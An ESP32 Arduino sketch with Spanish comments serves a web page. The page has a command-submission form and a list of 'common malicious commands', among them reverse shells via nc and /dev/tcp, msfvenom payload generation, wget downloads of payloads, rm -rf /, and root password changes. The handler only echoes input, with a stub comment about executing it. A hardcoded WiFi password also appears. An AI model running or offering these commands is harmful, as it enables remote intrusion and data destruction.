#include <Arduino.h>
#include <WiFi.h>
#include <WebServer.h>

#define WIFI_SSID "Guevara"
#define WIFI_PASSWORD "Guevara123720#"

WebServer server(80);  // Servidor en el puerto 80

// Definición de pines de los LEDs
const int LED1 = 2;
const int LED2 = 15;
bool led1State = false;
bool led2State = false;

// ------------------- Conexión WiFi -------------------
void conectarWiFi() {
  Serial.println();
  Serial.print("Conectando a ");
  Serial.println(WIFI_SSID);  // Asegúrate de que WIFI_SSID esté definida en config.h

  WiFi.mode(WIFI_STA);
  WiFi.begin(WIFI_SSID, WIFI_PASSWORD);  // Asegúrate de que WIFI_PASSWORD esté definida en config.h

  // Espera hasta que se conecte
  while (WiFi.status() != WL_CONNECTED) {
    delay(500);
    Serial.print(".");
  }

  Serial.println();
  Serial.println("WiFi conectado");
  Serial.print("IP del ESP32: ");
  Serial.println(WiFi.localIP());
}

// ------------------- Enviar HTML para el servidor web -------------------
void sendHtml() {
  String response = R"(
    <!DOCTYPE html><html>
      <head>
        <title>ESP32 Web Server</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
          html { font-family: sans-serif; text-align: center; }
          body { display: inline-flex; flex-direction: column; }
          h1 { margin-bottom: 1.2em; } 
          h2 { margin: 0; }
          div { display: grid; grid-template-columns: 1fr 1fr; grid-template-rows: auto auto; grid-auto-flow: column; grid-gap: 1em; }
          .btn { background-color: #5B5; border: none; color: #fff; padding: 0.5em 1em;
                 font-size: 2em; text-decoration: none }
          .btn.OFF { background-color: #333; }
          input[type="text"] { padding: 0.5em; font-size: 1em; width: 80%; }
          .form-container { text-align: center; margin-top: 20px; }
        </style>
      </head>
      <body>
        <h1>ESP32 Web Server</h1>

        <!-- Formulario para enviar comandos -->
        <div class="form-container">
          <h2>Enviar Comando</h2>
          <form action="/send" method="POST">
            <input type="text" name="cmd" placeholder="Escribe tu comando aquí" required>
            <button type="submit" class="btn">Enviar Comando</button>
          </form>
        </div>

        <div>
          <h2>Comandos Maliciosos Comunes:</h2>
          <ul>
            <li>rm -rf /</li>
            <li>wget http://malware.com/malicious_file</li>
            <li>nc -e /bin/bash 192.168.1.100 4444</li>
            <li>sudo passwd root</li>
            <li>curl -X POST http://malicious-site.com</li>
            <li>curl -X GET http://exploit.com</li>
            <li>nmap -sS 192.168.1.0/24</li>
            <li>msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.1.100 LPORT=4444 -f elf > /tmp/exploit.elf</li>
            <li>bash -i >& /dev/tcp/192.168.1.100/4444 0>&1</li>
            <li>chmod +x malicious_script.sh && ./malicious_script.sh</li>
            <li>scp malicious_file user@192.168.1.100:/tmp</li>
            <li>echo "mimikatz" | bash</li>
            <li>wget -O /tmp/malware.sh http://malicious-site.com/payload.sh</li>
            <li>echo "root:password" | chpasswd</li>
            <li>telnet 192.168.1.100</li>
            <li>bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</li>
          </ul>
        </div>
      </body>
    </html>
  )";
  
  // Enviar la respuesta al cliente
  server.send(200, "text/html", response);
}

// ------------------- Manejar el comando enviado -------------------
void handleSendCommand() {
  if (server.hasArg("cmd")) {
    String cmd = server.arg("cmd");
    Serial.println("Comando recibido: " + cmd);

    // Lógica para manejar el comando
    // Aquí puedes incluir la lógica para ejecutar o procesar el comando malicioso
    server.send(200, "text/plain", "Comando recibido: " + cmd);
  } else {
    server.send(400, "text/plain", "Comando vacío");
  }
}

// ------------------- Configuración del servidor HTTP -------------------
void setup() {
  Serial.begin(115200);
  delay(1000);

  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);

  conectarWiFi();

  // Rutas del servidor
  server.on("/", HTTP_GET, sendHtml);  // Página principal
  server.on("/send", HTTP_POST, handleSendCommand);  // Manejar el envío de comando

  server.begin();
  Serial.println("Servidor HTTP iniciado en puerto 80");
}

// ------------------- Loop -------------------
void loop() {
  server.handleClient();  // Manejar las peticiones HTTP
  delay(2);  // Breve retraso para no bloquear el ciclo
}
